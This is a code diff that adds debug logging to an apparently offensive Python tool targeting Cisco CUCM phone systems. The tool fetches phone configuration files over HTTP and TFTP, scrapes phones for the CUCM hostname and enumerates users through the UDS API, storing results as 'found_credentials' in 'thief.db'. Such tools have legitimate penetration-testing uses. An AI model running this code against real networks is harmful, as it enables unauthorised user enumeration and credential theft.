@@ -30,6 +30,11 @@ UDS_PORT = 8443
 debug = False
 found_credentials = []
 found_usernames = []
+
+
+def dbg(msg):
+    if globals().get('debug', False):
+        print(f'[DEBUG] {msg}', flush=True)
 file_names = ''
 hostnames = []
 db_file = 'thief.db'
@@ -162,13 +167,17 @@ def download_config_http(cucm_host, filename, timeout=5):
     if _TEST_MODE:
         return _TEST_CONFIG
 
+    url = f'http://{cucm_host}:{HTTP_TFTP_PORT}/{filename}'
+    dbg(f'HTTP GET {url} (timeout={timeout}s)')
     try:
-        url = f'http://{cucm_host}:{HTTP_TFTP_PORT}/{filename}'
         resp = requests.get(url, verify=False, timeout=timeout)
-        if re.match(r"^[2]\d\d$", str(resp.status_code)):
-            return resp.text
-    except Exception:
-        pass
+    except Exception as e:
+        dbg(f'HTTP {url} raised {type(e).__name__}: {e}')
+        return None
+    dbg(f'HTTP {url} -> {resp.status_code} ({len(resp.content)} bytes)')
+    if re.match(r"^[2]\d\d$", str(resp.status_code)):
+        return resp.text
+    dbg(f'HTTP {url} non-2xx body (first 200 chars): {resp.text[:200]!r}')
     return None
 
 
@@ -176,6 +185,7 @@ def download_config_tftp(cucm_host, filename, timeout=5, raise_on_error=False):
     if _TEST_MODE:
         return _TEST_CONFIG
 
+    dbg(f'TFTP GET tftp://{cucm_host}:69/{filename} (timeout={timeout}s)')
     tmp_path = None
     try:
         with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
@@ -183,8 +193,11 @@ def download_config_tftp(cucm_host, filename, timeout=5, raise_on_error=False):
         client = tftpy.TftpClient(cucm_host, 69)
         client.download(filename, tmp_path, timeout=timeout)
         with open(tmp_path, "r", errors="ignore") as handle:
-            return handle.read()
-    except Exception:
+            data = handle.read()
+        dbg(f'TFTP {cucm_host}/{filename} -> {len(data)} bytes')
+        return data
+    except Exception as e:
+        dbg(f'TFTP {cucm_host}/{filename} raised {type(e).__name__}: {e}')
         if raise_on_error:
             raise
         return None
@@ -349,15 +362,19 @@ def get_hostname_from_phone(phone_ip):
     if _TEST_MODE:
         return os.getenv("THIEF_TEST_PHONE_HOSTNAME") or "SEPTEST00000000"
 
+    url = f'http://{phone_ip}/NetworkConfiguration'
+    dbg(f'Phone hostname lookup: GET {url}')
     try:
-        url = f'http://{phone_ip}/NetworkConfiguration'
         resp = requests.get(url, verify=False, timeout=3)
-        match = re.search(r'Host\s+Name.*?<b>\s*([A-Za-z0-9]+)\s*</b>',
-                          resp.text, re.IGNORECASE | re.DOTALL)
-        if match:
-            return match.group(1)
-    except Exception:
-        pass
+    except Exception as e:
+        dbg(f'Phone {phone_ip} NetworkConfiguration raised {type(e).__name__}: {e}')
+        return None
+    dbg(f'Phone {phone_ip} NetworkConfiguration -> {resp.status_code} ({len(resp.content)} bytes)')
+    match = re.search(r'Host\s+Name.*?<b>\s*([A-Za-z0-9]+)\s*</b>',
+                      resp.text, re.IGNORECASE | re.DOTALL)
+    if match:
+        return match.group(1)
+    dbg(f'Phone {phone_ip}: "Host Name" pattern not found in NetworkConfiguration body')
     return None
 
 
@@ -375,12 +392,20 @@ def get_cucm_name_from_phone(phone_ip):
     if _TEST_MODE:
         return "mock-cucm"
 
+    url = f'http://{phone_ip}/NetworkConfiguration'
+    dbg(f'CUCM discovery: GET {url}')
     try:
-        url = f'http://{phone_ip}/NetworkConfiguration'
         resp = requests.get(url, verify=False, timeout=3)
-        return parse_cucm(resp.text)
-    except Exception:
+    except Exception as e:
+        dbg(f'CUCM discovery {phone_ip} raised {type(e).__name__}: {e}')
         return None
+    dbg(f'CUCM discovery {phone_ip} -> {resp.status_code} ({len(resp.content)} bytes)')
+    cucm = parse_cucm(resp.text)
+    if not cucm:
+        dbg(f'CUCM discovery {phone_ip}: no CUCM hostname matched in response body')
+    else:
+        dbg(f'CUCM discovery {phone_ip}: parsed CUCM = {cucm}')
+    return cucm
 
 
 def get_config_names(cucm_host, hostnames=None):
@@ -412,23 +437,26 @@ def get_users_api(cucm_host, port=UDS_PORT, page_size=64, timeout=10):
     first = 1
     while True:
         url = f'https://{cucm_host}:{port}/cucm-uds/users?first={first}&last={first + page_size - 1}'
+        dbg(f'UDS GET {url} (timeout={timeout}s)')
         try:
             resp = requests.get(url, verify=False, timeout=timeout)
         except Exception as e:
-            if globals().get('debug', False):
-                print(f'[!] UDS request error: {e}')
+            dbg(f'UDS {url} raised {type(e).__name__}: {e}')
             break
+        dbg(f'UDS {url} -> {resp.status_code} ({len(resp.content)} bytes)')
         if resp.status_code != 200:
-            if globals().get('debug', False):
-                print(f'[!] UDS returned HTTP {resp.status_code} for {url}')
+            dbg(f'UDS non-200 body (first 300 chars): {resp.text[:300]!r}')
             break
         page_users = re.findall(r'<userName>([^<]+)</userName>', resp.text)
+        dbg(f'UDS page first={first} parsed {len(page_users)} userName entries')
         if not page_users:
+            dbg(f'UDS empty page body (first 300 chars): {resp.text[:300]!r}')
             break
         users.extend(page_users)
         if len(page_users) < page_size:
             break
         first += page_size
+    dbg(f'UDS total users collected: {len(users)}')
     return users
 
 
